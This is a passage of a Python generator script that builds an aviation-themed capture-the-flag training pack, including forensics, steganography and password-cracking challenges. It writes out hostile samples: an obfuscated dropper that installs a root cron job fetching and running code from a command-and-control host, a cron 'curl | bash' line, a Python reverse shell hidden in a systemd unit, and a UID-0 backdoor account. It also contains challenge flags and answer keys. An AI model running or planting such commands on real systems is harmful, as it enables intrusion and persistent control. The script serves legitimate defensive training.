    rot = codecs.encode("Ground: lockbox code for hangar 3 is in the note -> " + fl, "rot_13")
    inject_at = 57
    for i in range(110):
        t += timedelta(seconds=random.randint(10, 120))
        reg = random.choice(regs)
        label = random.choice(list(labels))
        text = random.choice(texts)
        if i == inject_at:
            reg, label, text = "OO-SSU", "H1", "FREETEXT " + rot
        flight = "SN%04d" % random.randint(1, 3999)
        out.append(f"[#{random.randint(1,4)} (F:131.725 L:{random.randint(-40,-20)} E:0) {t.strftime('%d/%m/%Y %H:%M:%S')} --------------------------------\n"
                   f"Mode : 2 Label : {label} Id : {random.randint(1,9)} Ack : NAK\n"
                   f"Aircraft reg: .{reg} Flight id: {flight}\n"
                   f"No: M{random.randint(10,99)}A\n{text}\n")
    wtext(cid, "acarsdec_131725.log", "\n".join(out))


# ---------------------------------------------------------------------------
# 15 GNSS spoofing in NMEA
# ---------------------------------------------------------------------------
def nmea(body):
    cs = 0
    for ch in body:
        cs ^= ord(ch)
    return "$%s*%02X" % (body, cs)


def deg2nmea(v, lat=True):
    a = abs(v)
    d = int(a)
    m = (a - d) * 60
    if lat:
        return "%02d%07.4f" % (d, m), "N" if v >= 0 else "S"
    return "%03d%07.4f" % (d, m), "E" if v >= 0 else "W"


def c_gnss():
    cid = "15-gnss-spoofing"
    fl = "AVIANS{142317}"
    flag(cid, fl)
    lines = []
    lat, lon = 50.9010, 4.4844   # near EBBR
    t = datetime(2026, 11, 14, 14, 0, 0)
    spoof_t = datetime(2026, 11, 14, 14, 23, 17)
    slat, slon = 0, 0
    for k in range(0, 3600, 1):
        now = t + timedelta(seconds=k)
        if now < spoof_t:
            lat += 0.0009 * 0.6
            lon += 0.0012 * 0.6
            plat, plon, sats, hdop = lat, lon, random.randint(9, 12), random.uniform(0.7, 1.1)
            spd = 410
        else:
            if not slat:
                slat, slon = lat + 2.1, lon - 3.4   # sudden ~300 km jump
            slat += 0.00001
            plat, plon, sats, hdop = slat, slon, 14, 0.5
            spd = 0.3  # stationary-looking spoof
        la, ns = deg2nmea(plat, True)
        lo, ew = deg2nmea(plon, False)
        hhmmss = now.strftime("%H%M%S") + ".00"
        if k % 1 == 0:
            lines.append(nmea(f"GPGGA,{hhmmss},{la},{ns},{lo},{ew},1,{sats:02d},{hdop:.1f},{11277 if now < spoof_t else 0:.1f},M,46.0,M,,"))
            lines.append(nmea(f"GPRMC,{hhmmss},A,{la},{ns},{lo},{ew},{spd:.1f},{48.0 if now < spoof_t else 0:.1f},{now.strftime('%d%m%y')},,,A"))
    wtext(cid, "fdr_gnss_SNX2405.nmea", "\n".join(lines) + "\n")


# ---------------------------------------------------------------------------
# PNG helpers
# ---------------------------------------------------------------------------
def png_bytes(w, h, pixel_fn, text_chunks=()):
    raw = bytearray()
    for y in range(h):
        raw.append(0)
        for x in range(w):
            raw += bytes(pixel_fn(x, y))

    def chunk(typ, data):
        return struct.pack("!I", len(data)) + typ + data + struct.pack("!I", zlib.crc32(typ + data) & 0xFFFFFFFF)
    out = b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack("!IIBBBBB", w, h, 8, 2, 0, 0, 0))
    for k, v in text_chunks:
        out += chunk(b"tEXt", k.encode() + b"\x00" + v.encode())
    out += chunk(b"IDAT", zlib.compress(bytes(raw), 9)) + chunk(b"IEND", b"")
    return out


def sky(x, y):
    # dusk sky gradient with a runway
    if y > 150:
        g = 60 + (x * 3 % 20)
        if abs(x - 160) < (y - 150) * 0.9 and abs(x - 160) > (y - 150) * 0.85:
            return (230, 230, 230)
        if abs(x - 160) < 3 and (y // 8) % 2:
            return (240, 240, 240)
        return (g, g, g + 5)
    return (30 + y // 3, 50 + y // 2, 120 + y // 2)


def c_cockpit_selfie():
    cid = "16-cockpit-selfie"
    fl = "AVIANS{metadata_tells_all}"
    flag(cid, fl)
    data = png_bytes(320, 200, sky, [("Author", "F/O K. Wouters"), ("Software", "SkyCam 2.1"),
                                      ("Description", "Final approach RWY 25L EBBR, sunset"),
                                      ("Comment", "Crew-only shared photo. Ref: " + fl)])
    wbin(cid, "final_approach_25L.png", data)


def c_stowaway():
    cid = "17-stowaway"
    fl = "AVIANS{binwalk_found_the_stowaway}"
    flag(cid, fl)
    img = png_bytes(320, 200, lambda x, y: (40 + y // 4, 40 + y // 4, 60 + y // 3))
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("stowaway/README.txt", "If you're reading this, you found what was hidden behind the image.\n" + fl + "\n")
    wbin(cid, "cargo_hold_cam.png", img + buf.getvalue())


def c_locked_bag(wordlist):
    cid = "18-locked-flight-bag"
    fl = "AVIANS{john_cracked_the_bag}"
    flag(cid, fl)
    pw = "Skyhawk172"
    assert pw in wordlist
    tmp = os.path.join(cdir(cid), "_tmp")
    os.makedirs(tmp, exist_ok=True)
    with open(os.path.join(tmp, "EFB_notes.txt"), "w") as f:
        f.write("Electronic Flight Bag - personal notes\nDon't forget to update AIRAC cycle.\n" + fl + "\n")
    target = os.path.join(cdir(cid), "flight_bag.zip")
    if os.path.exists(target):
        os.remove(target)
    subprocess.run(["zip", "-q", "-j", "-P", pw, target, os.path.join(tmp, "EFB_notes.txt")], check=True)
    shutil.rmtree(tmp)


def c_crew_hashes(wordlist):
    cid = "19-crew-hashes"
    target_pw = "landinggear7"
    assert target_pw in wordlist
    fl = "AVIANS{" + target_pw + "}"
    flag(cid, fl)
    users = {"capt.lambert": target_pw, "fo.mertens": "Runway2026", "cc.jacobs": "x9$Lq!vP2#rT8mZw",
             "eng.claes": "turbine123", "disp.goossens": "Gk7&pWz!q2Lm9#Rt"}
    lines = ["# Dumped from crewportal DB table crew_accounts (MD5, unsalted - yes, really)"]
    for u, pw in users.items():
        lines.append(f"{u}:{hashlib.md5(pw.encode()).hexdigest()}")
    wtext(cid, "crew_accounts.hashes", "\n".join(lines) + "\n")


# ---------------------------------------------------------------------------
# 20 Malware triage: obfuscated dropper
# ---------------------------------------------------------------------------
def c_dropper():
    cid = "20-baggage-dropper"
    fl = "AVIANS{never_run_what_you_cannot_read}"
    flag(cid, fl)
    inner = f"""#!/bin/bash
# stage 2
C2="bhs-telemetry-sync.net"
KEY="{fl}"
echo "*/5 * * * * root curl -s http://$C2/t | bash" > /etc/cron.d/bhs-sync
curl -s -X POST -d "$(hostname):$(id -u)" http://$C2/checkin
"""
    stage = base64.b64encode(gzip.compress(inner.encode(), mtime=0)).decode()
    rev = stage[::-1]
    outer = f"""#!/bin/bash
# BHS (Baggage Handling System) conveyor firmware updater v1.2
# DO NOT EDIT - generated by vendor tooling
set -e
_a="{rev}"
_b=$(echo "$_a" | rev)
echo "$_b" | base64 -d | gunzip | bash
echo "[+] conveyor firmware updated"
"""
    wtext(cid, "bhs_update.sh.txt", outer)


# ---------------------------------------------------------------------------
# 21 YARA hunt
# ---------------------------------------------------------------------------
def c_yara():
    cid = "21-yara-hunt"
    flag(cid, "AVIANS{sample_31}")
    d = os.path.join(cdir(cid), "samples")
    os.makedirs(d, exist_ok=True)
    rnd = random.Random(7)
    mutex = b"Global\\AVX-Tower-Mutex-7741"
    magic = bytes.fromhex("DEADC0DE7A11F1A9")
    for i in range(1, 51):
        body = bytearray(b"MZ" + bytes(rnd.getrandbits(8) for _ in range(rnd.randint(3000, 9000))))
        has_m = i in (4, 18, 31, 44)
        has_x = i in (9, 31, 37)
        if has_m:
            pos = rnd.randint(200, len(body) - 100)
            body[pos:pos] = mutex
        if has_x:
            pos = rnd.randint(200, len(body) - 100)
            body[pos:pos] = magic
        if i == 23:
            body[500:500] = b"Global\\AVX-Tower-Mutex-1234"  # near-miss decoy
        with open(os.path.join(d, f"sample_{i:02d}.bin"), "wb") as f:
            f.write(bytes(body))
    wtext(cid, "threat_intel_report.txt", """\
TLP:CLEAR - Sector threat intelligence (fictional training data)
Actor: "TOWER JACKAL" - targets airport ground handling and ATC support systems.

Indicators for the "JackalLoader" implant:
  * Creates mutex:  Global\\AVX-Tower-Mutex-7741        (ASCII string)
  * Contains config marker bytes:  DE AD C0 DE 7A 11 F1 A9

A sample is considered JackalLoader ONLY if BOTH indicators are present.
Other samples containing only one of them belong to unrelated tooling.

Task: 50 binaries were quarantined from the baggage handling servers.
Find the JackalLoader sample.
""")


# ---------------------------------------------------------------------------
# 22 Persistence hunt in a server filesystem snapshot
# ---------------------------------------------------------------------------
def c_persistence():
    cid = "22-persistence-hunt"
    fl = "AVIANS{hunt_cron_systemd_and_ssh_keys}"
    flag(cid, fl)
    p1, p2, p3 = fl[:14], fl[14:27], fl[27:]
    files = {
        "etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
                      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\n"
                      "flightops:x:1000:1000:Flight Ops,,,:/home/flightops:/bin/bash\n"
                      "sysupdate:x:0:0:System Update Service:/var/lib/sysupdate:/bin/bash\n",
        "etc/crontab": "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
                       "17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n"
                       "25 6\t* * *\troot\ttest -x /usr/sbin/anacron || run-parts --report /etc/cron.daily\n",
        "etc/cron.d/logrotate-extra": "# rotate METAR cache\n0 3 * * * root /usr/sbin/logrotate /etc/logrotate.d/metar\n",
        "etc/cron.d/.sys-health": "# health check\n*/10 * * * * root /bin/bash -c 'echo " +
                                   base64.b64encode(("curl -s http://203.0.113.77/h | bash # part1=" + p1).encode()).decode() +
                                   " | base64 -d | bash'\n",
        "etc/systemd/system/metar-cache.service": "[Unit]\nDescription=METAR cache warmer\n\n[Service]\nExecStart=/usr/local/bin/metar-cache --interval 600\nUser=flightops\n\n[Install]\nWantedBy=multi-user.target\n",
        "etc/systemd/system/dbus-org.freedesktop.sync.service": "[Unit]\nDescription=D-Bus Sync Helper\nAfter=network.target\n\n[Service]\n"
                                                                 "ExecStart=/usr/bin/python3 -c \"import socket,os;s=socket.socket();s.connect(('203.0.113.77',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system('/bin/sh')\"\n"
                                                                 f"# build-id (part2, hex): {p2.encode().hex()}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\n",
        "home/flightops/.ssh/authorized_keys": "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK3lq7v0k8yH1x2Yt7rG0p9m4dGqF3cRZ0a8fLwT1xY flightops@ops-laptop\n"
                                               "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7" + base64.b64encode(random.randbytes(180)).decode() + " part3=" + p3 + "\n",
        "home/flightops/.bashrc": "# ~/.bashrc\nexport PS1='\\u@\\h:\\w\\$ '\nalias ll='ls -alF'\nalias metar='curl -s https://aviationweather.gov/api/data/metar?ids=EBBR'\n",
        "root/.bash_history": "apt update\napt upgrade -y\nsystemctl status metar-cache\nuseradd -o -u 0 -g 0 -M -d /var/lib/sysupdate -s /bin/bash sysupdate\n"
                              "echo 'sysupdate:Upd4te!' | chpasswd\nsystemctl enable dbus-org.freedesktop.sync.service\nhistory -c\n",
        "var/log/README": "Logs were rotated before acquisition.\n",
    }
    target = os.path.join(cdir(cid), "metar-srv02_triage.tar.gz")
    with tarfile.open(target, "w:gz") as tar:
        for path, content in sorted(files.items()):
            data = content.encode()
            ti = tarfile.TarInfo("metar-srv02/" + path)
            ti.size = len(data)
            ti.mtime = int(T0)
            ti.mode = 0o600 if ".ssh" in path or "history" in path else 0o644
            tar.addfile(ti, io.BytesIO(data))


# ---------------------------------------------------------------------------
def main():
    if os.path.isdir(OUT):
        shutil.rmtree(OUT)
    os.makedirs(OUT)
    wl = shared_wordlist()
    c_boarding_pass()
    c_mystery_cargo()
    c_fmc_firmware()
    c_ftp()
    c_manifest_exfil()
    c_dns()
    c_scan()
    c_bruteforce()
    c_sqli()
    c_powershell()
    c_adsb()
    c_squawk()
    c_acars()
    c_gnss()
    c_cockpit_selfie()
    c_stowaway()
    c_locked_bag(wl)
    c_crew_hashes(wl)
    c_dropper()
    c_yara()
    c_persistence()

    hashes = {cid: hashlib.sha256(v.strip().lower().encode()).hexdigest() for cid, v in FLAGS.items()}
    with open(os.path.join(ROOT, "portal", "flags.js"), "w") as f:
        f.write("// Generated by generator/build.py - SHA-256 of lower-cased flags. No plaintext here.\n")
        f.write("window.FLAG_HASHES = " + json.dumps(hashes, indent=2) + ";\n")
    os.makedirs(os.path.join(ROOT, "solutions"), exist_ok=True)
    with open(os.path.join(ROOT, "solutions", "FLAGS_SPOILERS.txt"), "w") as f:
        f.write("SPOILERS! All flags.\n\n" + "\n".join(f"{k}: {v}" for k, v in FLAGS.items()) + "\n")

    # one zip with everything for easy download
    pack = os.path.join(OUT, "avians-ctf-pack.zip")
    with zipfile.ZipFile(pack, "w", zipfile.ZIP_DEFLATED) as z:
        for dp, _, fns in os.walk(OUT):
            for fn in fns:
                full = os.path.join(dp, fn)
                if full == pack:
                    continue
                z.write(full, os.path.relpath(full, OUT))
    print(f"Built {len(FLAGS)} challenges into {OUT}")


if __name__ == "__main__":
    main()
